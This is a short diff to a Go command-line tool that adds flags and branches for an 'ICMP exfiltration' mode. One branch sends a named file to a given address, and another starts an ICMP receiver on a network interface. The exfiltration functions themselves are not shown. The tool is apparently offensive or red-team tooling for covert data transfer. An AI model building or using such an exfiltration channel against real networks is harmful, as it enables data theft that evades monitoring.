@@ -8,16 +8,33 @@ import (
 	"time"
 )
 
+const (
+	DeadBeef = 0xdeadbeef
+)
+
 func main() {
 	fileNamePtr := flag.String("f", "", "Specify the file name for 'read' mode")
 	numRunsPtr := flag.Int("t", 0, "Specify the number of runs for 'execution' mode")
 	intervalMultiplierPtr := flag.Int("m", 0, "Specify the minutes multiplier for 'execution' mode")
+	ICMPExfilFileNamePtr := flag.String("eif", "", "Specify the file name for 'ICMP exfiltration' mode")
+	exfilAddr := flag.String("ea", "", "Specify the address for 'ICMP exfiltration' mode")
+	exfilICMPiface := flag.String("eii", "", "Specify the interface for 'ICMP exfiltration' mode")
+
 	flag.Parse()
 
 	if *fileNamePtr != "" {
 		displayFile(*fileNamePtr)
 	} else if *numRunsPtr > 0 && *intervalMultiplierPtr > 0 {
 		runProgram(*numRunsPtr, *intervalMultiplierPtr)
+	} else if *ICMPExfilFileNamePtr != "" && *exfilAddr != "" {
+		ICMPExfil := NewICMPExfil(*ICMPExfilFileNamePtr, *exfilAddr)
+		err := ICMPExfil.Exfiltrate()
+		if err != nil {
+			log.Fatalf("error on exfiltration: %v", err)
+		}
+	} else if *exfilICMPiface != "" {
+		receiver := NewICMPReceiver(*exfilICMPiface)
+		receiver.Start()
 	} else {
 		fmt.Printf("Usage of %s:\n", os.Args[0])
 		fmt.Println()
